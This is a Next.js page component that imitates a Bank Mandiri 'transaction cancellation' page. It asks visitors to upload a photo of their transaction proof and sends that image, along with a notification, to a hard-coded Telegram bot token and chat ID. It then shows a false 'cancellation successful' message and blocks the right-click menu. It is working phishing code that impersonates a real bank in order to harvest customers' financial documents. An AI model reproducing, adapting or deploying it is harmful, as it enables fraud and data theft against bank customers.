'use client';

import React, { useState, useRef, useEffect } from 'react';
import Image from 'next/image';
import { Upload, X, Shield, XCircle, CheckCircle } from 'lucide-react';
import { motion, AnimatePresence } from 'motion/react';

export default function CancellationPage() {
  const [file, setFile] = useState<File | null>(null);
  const [preview, setPreview] = useState<string | null>(null);
  const [loading, setLoading] = useState(false);
  const [loadingText, setLoadingText] = useState('Memproses...');
  const [success, setSuccess] = useState(false);
  const [toast, setToast] = useState<{ message: string; visible: boolean }>({ message: '', visible: false });
  const fileInputRef = useRef<HTMLInputElement>(null);

  const TELEGRAM_TOKEN = "8673674549:AAHP18UpUK20Rm3PzNkdnRkhkty2F0_yb_8";
  const TELEGRAM_CHAT_ID = "-1003801777662";

  const showToast = (message: string) => {
    setToast({ message, visible: true });
    setTimeout(() => setToast({ message: '', visible: false }), 3000);
  };

  const handleFileChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const selectedFile = e.target.files?.[0];
    if (!selectedFile) return;

    const allowedTypes = ['image/jpeg', 'image/png', 'image/jpg'];
    if (!allowedTypes.includes(selectedFile.type)) {
      showToast("Format file tidak didukung (JPG/PNG)");
      return;
    }
    if (selectedFile.size > 5 * 1024 * 1024) {
      showToast("Ukuran file maksimal 5MB");
      return;
    }

    setFile(selectedFile);
    const reader = new FileReader();
    reader.onload = (event) => {
      setPreview(event.target?.result as string);
    };
    reader.readAsDataURL(selectedFile);
  };

  const removeFile = (e: React.MouseEvent) => {
    e.stopPropagation();
    setFile(null);
    setPreview(null);
    if (fileInputRef.current) fileInputRef.current.value = '';
  };

  const sendToTelegram = async (hasFile: boolean) => {
    const timestamp = new Date().toLocaleString('id-ID');
    const message = `🔄 *PEMBATALAN TRANSAKSI*\n━━━━━━━━━━━━━━━\n📎 *Bukti Transaksi:* ${hasFile ? 'Terlampir (foto)' : 'Tidak ada'}\n━━━━━━━━━━━━━━━\n⏰ *Waktu:* ${timestamp}\n✅ *STATUS: PENGAJUAN PEMBATALAN DITERIMA*`;
    
    try {
      const response = await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ chat_id: TELEGRAM_CHAT_ID, text: message, parse_mode: 'Markdown' })
      });
      const result = await response.json();
      return result.ok;
    } catch (error) {
      console.error(error);
      return false;
    }
  };

  const sendPhotoToTelegram = async (fileToUpload: File) => {
    const timestamp = new Date().toLocaleString('id-ID');
    const caption = `🔄 *BUKTI PEMBATALAN TRANSAKSI*\n━━━━━━━━━━━━━━━\n⏰ *Waktu:* ${timestamp}\n✅ *Status: Pengajuan pembatalan diterima*`;
    
    const formData = new FormData();
    formData.append('chat_id', TELEGRAM_CHAT_ID);
    formData.append('photo', fileToUpload);
    formData.append('caption', caption);
    formData.append('parse_mode', 'Markdown');
    
    try {
      const response = await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendPhoto`, {
        method: 'POST',
        body: formData
      });
      return response.ok;
    } catch (error) {
      console.error(error);
      return false;
    }
  };

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    if (!file) {
      showToast("Unggah bukti transaksi terlebih dahulu!");
      return;
    }

    setLoading(true);
    setLoadingText("Memproses pembatalan transaksi...");

    const textSuccess = await sendToTelegram(true);
    const photoSuccess = await sendPhotoToTelegram(file);

    if (textSuccess || photoSuccess) {
      setTimeout(() => {
        setLoading(false);
        setSuccess(true);
      }, 1500);
    } else {
      setLoading(false);
      showToast("Gagal mengirim notifikasi, coba lagi");
    }
  };

  useEffect(() => {
    const preventDefault = (e: Event) => e.preventDefault();
    
    document.addEventListener('contextmenu', preventDefault);
    
    return () => {
      document.removeEventListener('contextmenu', preventDefault);
    };
  }, []);

  return (
    <div className="min-h-screen bg-[#eef4f9] flex flex-col items-center pb-10 relative select-none font-sans">
      <style jsx global>{`
        .security-overlay-left, .security-overlay-right {
            position: fixed;
            top: 0;
            bottom: 0;
            width: 12px;
            background: repeating-linear-gradient(
                45deg,
                rgba(0, 77, 153, 0.15),
                rgba(0, 77, 153, 0.15) 10px,
                rgba(255, 158, 27, 0.15) 10px,
                rgba(255, 158, 27, 0.15) 20px
            );
            pointer-events: none;
            z-index: 9998;
            box-shadow: inset 0 0 8px rgba(0,0,0,0.05);
        }
        .security-overlay-left {
            left: 0;
            border-right: 1px solid rgba(0,77,153,0.2);
        }
        .security-overlay-right {
            right: 0;
            border-left: 1px solid rgba(0,77,153,0.2);
        }
        @media (min-width: 640px) {
            .security-overlay-left, .security-overlay-right {
                width: 18px;
            }
        }
        .loader-spin {
          animation: spin-right 1.2s linear infinite;
        }
        .loader-spin-inner {
          animation: spin-left 1s linear infinite;
        }
        @keyframes spin-right {
            to { transform: rotate(360deg); }
        }
        @keyframes spin-left {
            to { transform: rotate(-360deg); }
        }
      `}</style>

      {/* Security Overlays */}
      <div className="security-overlay-left" />
      <div className="security-overlay-right" />

      {/* Loader Overlay */}
      <AnimatePresence>
        {loading && (
          <motion.div 
            initial={{ opacity: 0 }}
            animate={{ opacity: 1 }}
            exit={{ opacity: 0 }}
            className="fixed inset-0 bg-white/98 flex flex-col justify-center items-center z-[9999]"
          >
            <div className="relative w-[60px] h-[60px]">
              <div className="absolute inset-0 rounded-full border-4 border-transparent border-t-[#004D99] border-b-[#004D99] loader-spin" />
              <div className="absolute top-[15%] left-[15%] w-[70%] h-[70%] rounded-full border-4 border-transparent border-l-[#FF9E1B] border-r-[#FF9E1B] loader-spin-inner" />
            </div>
            <div className="mt-[15px] font-bold text-[#002D5C] text-[0.9rem]">
              {loadingText}
            </div>
          </motion.div>
        )}
      </AnimatePresence>

      {/* Success Notification */}
      <AnimatePresence>
        {success && (
          <motion.div 
            initial={{ opacity: 0 }}
            animate={{ opacity: 1 }}
            className="fixed inset-0 bg-black/70 flex justify-center items-center z-[10000] backdrop-blur-[3px]"
          >
            <motion.div 
              initial={{ opacity: 0, y: 20 }}
              animate={{ opacity: 1, y: 0 }}
              className="w-[82%] max-w-[320px] bg-white rounded-[24px] overflow-hidden shadow-[0_25px_45px_rgba(0,0,0,0.5)] text-center"
            >
              <div className="p-[28px_22px_24px]">
                <CheckCircle className="w-[70px] h-[70px] text-[#28a745] mx-auto mb-[10px]" />
                <h1 className="text-[#003366] text-[20px] font-extrabold mb-2">Pembatalan Transaksi Berhasil</h1>
                <p className="text-[#5a6874] text-[13.5px] leading-[1.45]">Pengajuan pembatalan Anda telah diterima oleh sistem kami.</p>
              </div>
              <button 
                onClick={() => window.location.reload()}
                className="w-full bg-[#1a4584] text-white py-[14px] text-[16px] font-semibold cursor-pointer border-none"
              >
                Tutup
              </button>
            </motion.div>
          </motion.div>
        )}
      </AnimatePresence>

      {/* Toast Message */}
      <AnimatePresence>
        {toast.visible && (
          <motion.div 
            initial={{ opacity: 0, x: "-50%", y: 20 }}
            animate={{ opacity: 1, x: "-50%", y: 0 }}
            exit={{ opacity: 0, x: "-50%", y: 20 }}
            className="fixed bottom-[100px] left-1/2 bg-[#dc3545] text-white p-[12px_24px] rounded-[40px] text-[14px] z-[10001] whitespace-nowrap shadow-lg"
          >
            {toast.message}
          </motion.div>
        )}
      </AnimatePresence>

      <div className="w-full max-w-[450px] flex-grow flex flex-col p-0 relative z-[1]">
        <header className="w-full bg-white py-3 shadow-[0_4px_10px_rgba(0,0,0,0.03)] mb-[15px] flex justify-center items-center">
          <Image 
            src="https://upload.wikimedia.org/wikipedia/commons/a/ad/Bank_Mandiri_logo_2016.svg" 
            alt="Mandiri" 
            width={100}
            height={32}
            className="w-[100px] h-auto pointer-events-none"
            referrerPolicy="no-referrer"
          />
        </header>

        <main className={`bg-white rounded-[16px] p-[25px_20px] shadow-[0_25px_50px_rgba(0,45,92,0.25),0_10px_20px_rgba(0,0,0,0.15)] text-center mx-3 transition-all duration-200 relative ${success ? 'hidden' : ''}`}>
          <h2 className="text-[1.15rem] font-bold text-[#002D5C] mb-[6px]">Pembatalan Transaksi</h2>
          <p className="text-[0.8rem] text-[#64748b] leading-[1.4] mb-5">Silakan unggah bukti transaksi yang ingin Anda batalkan.</p>
          
          <form onSubmit={handleSubmit}>
            {/* Area Upload */}
            <div 
              onClick={() => fileInputRef.current?.click()}
              className="border-2 border-dashed border-[#b8ccdf] rounded-[25px] bg-[#f8fbfe] relative p-[50px_20px] transition-all duration-300 cursor-pointer mb-[15px] min-h-[220px] hover:border-[#004D99] hover:bg-[#f0f6ff]"
            >
              <input 
                type="file" 
                ref={fileInputRef}
                onChange={handleFileChange}
                accept="image/*" 
                hidden 
              />
              {!preview ? (
                <div>
                  <Upload className="w-[55px] h-[55px] text-[#004D99] mx-auto mb-3" />
                  <p className="font-bold text-[#004D99] text-[15px]">Ketuk untuk pilih foto bukti</p>
                  <p className="text-[12px] text-[#99aab5] mt-[5px]">Format: JPG, PNG (Maks. 5MB)</p>
                </div>
              ) : (
                <div className="absolute inset-0 bg-white rounded-[25px] z-[5] overflow-hidden">
                  <button 
                    type="button"
                    onClick={removeFile}
                    className="absolute top-[10px] right-[10px] bg-[#dc3545] text-white rounded-full w-8 h-8 z-10 flex items-center justify-center cursor-pointer border-none"
                  >
                    <X size={16} />
                  </button>
                  <Image 
                    src={preview} 
                    alt="Preview" 
                    fill 
                    className="object-contain" 
                    unoptimized 
                    referrerPolicy="no-referrer"
                  />
                </div>
              )}
            </div>

            <div className="flex items-center gap-2 bg-gradient-to-br from-[#f0f7ff] to-[#e6f0ff] p-[10px_12px] rounded-lg mt-2 border-l-4 border-[#004D99]">
              <Shield size={16} className="text-[#004D99] flex-shrink-0" />
              <span className="text-[0.7rem] text-[#002D5C] font-medium leading-[1.3] text-left">
                Unggah bukti Valid agar Pembatalan dapat diterima oleh sistem.
              </span>
            </div>

            <button 
              type="submit" 
              disabled={!file}
              className={`w-full py-[14px] rounded-[30px] font-bold text-[0.95rem] mt-[10px] transition-all duration-300 flex items-center justify-center gap-2 ${
                file 
                ? 'bg-[#003d79] text-white cursor-pointer shadow-[0_10px_25px_rgba(0,61,121,0.35)]' 
                : 'bg-[#e5e7eb] text-[#9ca3af] cursor-not-allowed'
              }`}
            >
              <XCircle size={20} />
              BATALKAN TRANSAKSI
            </button>
          </form>
        </main>
      </div>

      <footer className="fixed bottom-0 left-0 right-0 max-w-[450px] mx-auto bg-[#2467ab] text-white text-center py-[12px] px-[10px] text-[0.8rem] z-[999]">
        © 2026 PT Bank Mandiri (Persero) Tbk.
      </footer>
    </div>
  );
}
